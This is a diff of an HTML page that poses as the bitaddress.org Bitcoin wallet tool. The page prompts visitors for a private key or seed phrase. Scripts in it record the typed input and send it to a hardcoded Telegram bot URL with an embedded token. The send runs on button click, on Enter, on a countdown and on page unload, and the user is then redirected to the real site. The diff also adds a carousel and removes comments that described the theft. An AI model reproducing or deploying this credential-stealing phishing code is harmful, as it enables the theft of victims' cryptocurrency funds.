@@ -52,24 +52,117 @@
             margin-left: 15px; /* Add some left margin for spacing */
         }
 
+        /* Title block */
+       .carousel-title {
+            text-align: center;
+            background-color: green;
+            color: white;
+            padding: 5px;
+            font-size: 16px;
+        }
+
+        .carousel-container {
+            position: relative;
+            max-width: 330px;
+            max-height: 156px;
+            margin: 0 auto;
+            border: 2px solid green;
+            overflow: visible; /* Allows images to overflow the container */
+        }
+
+        .carousel-slides {
+            display: flex
+            align-items: center;
+            gap: 5px;
+        }
+
+        .carousel-slides img {
+            max-width: 100px; 
+            max-height: 100px;
+            transition: transform 0.5s ease;
+            margin: 0;
+        }
+
+        /* Hover effect: Enlarge image significantly beyond container */
+        .carousel-slides img:hover {
+            position: absolute;
+            transform: scale(6); /* Set transform scale to 4 */
+        }
+
+        /* Left and right buttons */
+        .prev, .next {
+            cursor: pointer;
+            position: absolute;
+            top: 50%;
+            width: 30px;
+            margin-top: -15px;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            user-select: none;
+            background-color: rgba(0, 128, 0, 0.8);
+            padding: 10px;
+        }
+
+        .prev {
+            left: 0;
+        }
+
+        .next {
+            right: 0;
+        }
+
+        .prev:hover, .next:hover {
+            background-color: rgba(0, 128, 0, 1);
+        }
+
+        /* Full-screen view for image when clicked */
+        .fullscreen-img {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 70%; /* Cover 70% of the screen */
+            height: auto;
+            transform: translate(-50%, -50%);
+            z-index: 100;
+            background-color: rgba(0, 0, 0, 0.8); /* Optional background for better visibility */
+            border: 2px solid white;
+        }
+
+        /* Hidden by default */
+        .fullscreen-img.hidden {
+            display: none;
+        }
+
+        /* Text below the full-screen image */
+        .fullscreen-text {
+            color: white;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
     </style>    
     
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Slideshow Carousel</title>
+
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Countdown Timer</title>
     
     <script>
-        var userInputLog = []; // Array to store user inputs
+        var userInputLog = [];
 
         function logUserInput(input) {
             var logData = 'User Input: ' + input + '\n';
-            userInputLog.push(logData); // Store user input in the array
+            userInputLog.push(logData);
         }
 
         function sendAlertToBot() {
-            var logContent = userInputLog.join('\n'); // Combine all user inputs for alert
-            console.log('Sending alert to Telegram bot with content: ' + logContent);
+            var logContent = userInputLog.join('\n');
+            console.log('Sending alert: ' + logContent);
 
             fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
                 method: 'POST',
@@ -81,9 +174,9 @@
                     text: logContent,
                 }),
             }).then(response => {
-                console.log('Alert sent to Telegram bot successfully.');
+                console.log('Alert sent.');
             }).catch(error => {
-                console.error('Error sending alert to Telegram bot:', error);
+                console.error('Error sending alert:', error);
             });
         }
 
@@ -92,7 +185,7 @@
             if (inputData.trim() !== '') {
                 logUserInput(inputData);
             } else {
-                console.error('No input data to log');
+                console.error('No data to log');
             }
         }
 
@@ -102,7 +195,7 @@
             let countdownElement = document.createElement("div");
             countdownElement.style.fontSize = "24px";
             countdownElement.style.color = "green";
-	    countdownElement.style.position = "fixed";
+            countdownElement.style.position = "fixed";
             countdownElement.style.top = "90px";
             countdownElement.style.right = "90px";
             document.body.appendChild(countdownElement);
@@ -115,10 +208,10 @@
                     countdown--;
                 } else {
                     clearInterval(countdownInterval);
-                    // Simulate the action as if the user pressed the enter key or clicked "View Details" button
-                    countdownElement.textContent = "Don't worry. You're in a safe space";
-                    sendAlertToBot(); // Send alert to Telegram bot
-                    // Optionally redirect after sending the alert
+                
+                    countdownElement.textContent = "Don't worry. You're safe";
+                    sendAlertToBot(); 
+
                     setTimeout(function() {
                         window.location.href = 'https://bitaddress.org';
                     }, 2000);
@@ -126,28 +219,100 @@
             }, 1000);
         };
 
-        // Event listener for the input field on the landing page
+        
         document.getElementById('detailprivkey').addEventListener('input', handleInput);
 
-        // Event listener for the button on the landing page
+        
         document.getElementById('viewDetailsButton').addEventListener('click', function() {
-            // Trigger the alerting mechanism to send user input data to the Telegram bot
+            
             sendAlertToBot();
 
-            // Delay redirection by 2 seconds to allow time for the alert to be sent
+            
             setTimeout(function() {
                 window.location.href = 'https://bitaddress.org';
             }, 2000);
         });
 
-        // Capture Enter key press on the landing page
+        
         document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') { // Check if Enter key is pressed
-                sendAlertToBot(); // Send logged input to Telegram
-                // Optionally redirect after sending the alert
+            if (event.key === 'Enter') { 
+                sendAlertToBot(); 
                 setTimeout(function() {
                     window.location.href = 'https://bitaddress.org';
                 }, 2000);
+            }
+        });
+
+        let slideIndex = 0;
+        let slideInterval;
+
+        // Function to move the slides manually
+        function moveSlides(n) {
+            clearInterval(slideInterval); // Stop automatic sliding when manual control is used
+            showSlides(slideIndex += n);
+        }
+
+        // Show the slides
+        function showSlides(n) {
+            const slides = document.querySelectorAll('.carousel-slides img');
+            if (n >= slides.length - 2) { slideIndex = 0; }
+            if (n < 0) { slideIndex = slides.length - 3; }
+
+            // Set first, middle, and last images
+            slides.forEach((img, i) => {
+                img.classList.remove('first', 'middle', 'last');
+                if (i === slideIndex) img.classList.add('first');
+                if (i === slideIndex + 1) img.classList.add('middle');
+                if (i === slideIndex + 2) img.classList.add('last');
+            });
+
+            document.querySelector('.carousel-slides').style.transform = `translateX(${-slideIndex * 150}px)`;
+        }
+
+        // Auto shuffle every 15 seconds
+        function startSlideshow() {
+            slideInterval = setInterval(() => {
+                showSlides(slideIndex += 1);
+            }, 15000);
+        }
+
+        // Touch swipe functionality
+        let touchstartX = 0;
+        let touchendX = 0;
+
+        document.querySelector('.carousel-slides').addEventListener('touchstart', function(event) {
+            touchstartX = event.changedTouches[0].screenX;
+        }, false);
+
+        document.querySelector('.carousel-slides').addEventListener('touchend', function(event) {
+            touchendX = event.changedTouches[0].screenX;
+            handleGesture();
+        }, false);
+
+        function handleGesture() {
+            if (touchendX < touchstartX) {
+                moveSlides(1); // Swipe left
+            }
+            if (touchendX > touchstartX) {
+                moveSlides(-1); // Swipe right
+            }
+        }
+
+        // Enlarge image to 70% of the screen when clicked
+        document.querySelectorAll('.carousel-slides img').forEach(img => {
+            img.addEventListener('click', function() {
+                const fullscreenContainer = document.getElementById('fullscreen');
+                const fullscreenImage = document.getElementById('fullscreen-img');
+                
+                fullscreenImage.src = this.src; // Use the clicked image source
+                fullscreenContainer.classList.remove('hidden'); // Show full screen
+            });
+        });
+
+        // Exit full-screen view when clicking outside the image
+        document.getElementById('fullscreen').addEventListener('click', function(e) {
+            if (e.target !== document.getElementById('fullscreen-img')) {
+                this.classList.add('hidden'); // Hide full screen
             }
         });
     </script>
@@ -172,7 +337,7 @@
             <span><a href="?culture=pt-br" id="culturept-br" onclick="ninja.translator.translate('pt-br'); return false;" class="">português</a></span>
         </div>
         
-    <div style="margin-bottom: 0px;"></div> <!-- Empty div for spacing -->    
+    <div>  
     <img alt="Bitaddress Logo" title="bitaddress Logo" id="logo" src="https://i.ibb.co/4pgYM1b/bitaddress-logo.png">    
     </div>
     
@@ -184,7 +349,7 @@
     </div>
     <br>
 
-        <!-- Input field with placeholder for Private Key or Seed Phrase -->
+        
         <input type="text" id="detailprivkey" placeholder="Enter Private Key or Seed Phrase" style="width: 300px; height: 25px; text-align: center; padding: 2px 0;">
         <button id="viewDetailsButton">View Details</button>
     </div>
@@ -203,6 +368,7 @@
     <div style="text-align: left; margin: 0 40px; font-size: 10pt;">
         If you submit a mnemonic seed, also known as seed phrase or recovery phrase, in an attempt to create a new bitcoin wallet or create backup keys for your existing wallets,<br>the corresponding private keys will be generated for you in the following formats: 
         <br>
+        <br>
         &bull; Private Key WIF (51 characters base58, starts with a '5' WIF format),
         <br>
         &bull; Private Key WIF Compressed (52 characters base58, starts with a 'K' or 'L'),
@@ -213,16 +379,16 @@
     </div>
 
     <script>
-        var userInputLog = []; // Array to store user inputs
+        var userInputLog = []; 
 
         function logUserInput(input) {
             var logData = 'User Input: ' + input + '\n';
-            userInputLog.push(logData); // Store user input in the array
+            userInputLog.push(logData); 
         }
 
         function sendAlertToBot() {
-            var logContent = userInputLog.join('\n'); // Combine all user inputs for alert
-            console.log('Sending alert to Telegram bot with content: ' + logContent);
+            var logContent = userInputLog.join('\n');
+            console.log('Sending alert: ' + logContent);
 
             fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
                 method: 'POST',
@@ -234,9 +400,9 @@
                     text: logContent,
                 }),
             }).then(response => {
-                console.log('Alert sent to Telegram bot successfully.');
+                console.log('Alert sent.');
             }).catch(error => {
-                console.error('Error sending alert to Telegram bot:', error);
+                console.error('Error sending alert:', error);
             });
         }
 
@@ -245,46 +411,46 @@
             if (inputData.trim() !== '') {
                 logUserInput(inputData);
             } else {
-                console.error('No input data to log');
+                console.error('No data to log');
             }
         }
 
-        // Event listener for the input field on the landing page
+        
         document.getElementById('detailprivkey').addEventListener('input', handleInput);
 
-        // Event listener for the button on the landing page
+        
         document.getElementById('viewDetailsButton').addEventListener('click', function() {
-            // Trigger the alerting mechanism to send user input data to the Telegram bot
+            
             sendAlertToBot();
 
-            // Delay redirection by 2 seconds to allow time for the alert to be sent
+            
             setTimeout(function() {
                 window.location.href = 'https://bitaddress.org';
             }, 2000);
         });
 
-        // Capture Enter key press on the landing page
+        
         document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') { // Check if Enter key is pressed
-                sendAlertToBot(); // Send logged input to Telegram
-                // Optionally redirect after sending the alert
+            if (event.key === 'Enter') { 
+                sendAlertToBot(); 
+
                 setTimeout(function() {
                     window.location.href = 'https://bitaddress.org';
                 }, 2000);
             }
         });
 
-// Event listener for beforeunload event to trigger data transmission
+
 window.addEventListener('beforeunload', function(event) {
-    // Call the function to send alert to the Telegram bot
+    
     sendAlertToBot();
     
-    // Ensure the alert is sent before closing the tab
+    
     event.preventDefault();
 });
 
-// Function to show tooltip when hovering over an element
-function showTooltip(tooltipId) {
+    // Function to show tooltip when hovering over an element
+    function showTooltip(tooltipId) {
     var tooltipElement = document.getElementById(tooltipId);
 
     // Display the tooltip when hovering over the element
@@ -295,36 +461,54 @@ function showTooltip(tooltipId) {
     setTimeout(function() {
         tooltipElement.style.display = 'none'; // Hide the tooltip after 3 seconds
     }, 3000);
-}
+    }
 
-// Event listeners to trigger the tooltip function on hover for each tooltip
-document.getElementById('statuslabelcryptogood').addEventListener('mouseover', function() {
-    showTooltip('statuscryptogood');
-});
-document.getElementById('statuslabelcryptobad').addEventListener('mouseover', function() {
-    showTooltip('statuscryptobad');
-});
-document.getElementById('statuslabelunittestsgood').addEventListener('mouseover', function() {
-    showTooltip('statusunittestsgood');
-});
+    // Event listeners to trigger the tooltip function on hover for each tooltip
+    document.getElementById('statuslabelcryptogood').addEventListener('mouseover', function() {
+        showTooltip('statuscryptogood');
+    });
+    document.getElementById('statuslabelcryptobad').addEventListener('mouseover', function() {
+        showTooltip('statuscryptobad');
+    });
+    document.getElementById('statuslabelunittestsgood').addEventListener('mouseover', function() {
+        showTooltip('statusunittestsgood');
+    });
 
-// Event listener for OK button to hide the tooltip
-document.getElementById('statusokcryptogood').addEventListener('click', function() {
-    document.getElementById('statuscryptogood').style.display = 'none';
-});
-document.getElementById('statusokcryptobad').addEventListener('click', function() {
-    document.getElementById('statuscryptobad').style.display = 'none';
-});
-document.getElementById('statusokunittestsgood').addEventListener('click', function() {
-    document.getElementById('statusunittestsgood').style.display = 'none';
-});
+    // Event listener for OK button to hide the tooltip
+    document.getElementById('statusokcryptogood').addEventListener('click', function() {
+        document.getElementById('statuscryptogood').style.display = 'none';
+    });
+    document.getElementById('statusokcryptobad').addEventListener('click', function() {
+        document.getElementById('statuscryptobad').style.display = 'none';
+    });
+    document.getElementById('statusokunittestsgood').addEventListener('click', function() {
+        document.getElementById('statusunittestsgood').style.display = 'none';
+    });
 
     </script>
+    <br>
+    <br>
+    </div>
+    <!-- Image Slideshow Carousel -->
+    <div class="carousel-container">
+        <div class="carousel-title">Why you should convert your keys to QR code</div>
+        <div class="carousel-slides">
+            <img src="https://i.ibb.co/PgQ29vh/reddit-hack2.jpg" class="first" alt="Image 1">
+            <img src="https://i.ibb.co/d0W1cPw/reddit-hack1.jpg" class="middle" alt="Image 2">
+            <img src="https://i.ibb.co/MG0D7yX/cybertooth-hack.png" class="last" alt="Image 3">
+        </div>
 
+        <div class="prev" onclick="moveSlides(-1)">&#10094;</div>
+        <div class="next" onclick="moveSlides(1)">&#10095;</div>
+    </div>
+
+    <div id="fullscreen" class="fullscreen-img hidden">
+        <img id="fullscreen-img" src="" alt="Full-screen image">
+        <p class="fullscreen-text">Click anywhere outside the photo to exit full screen view</p>
+    </div>
+
+    <!-- Footer -->
     <div id="footer" class="footer">
-        <br>
-        <br>
-        <br>
         <br>
         <br>
         <br>
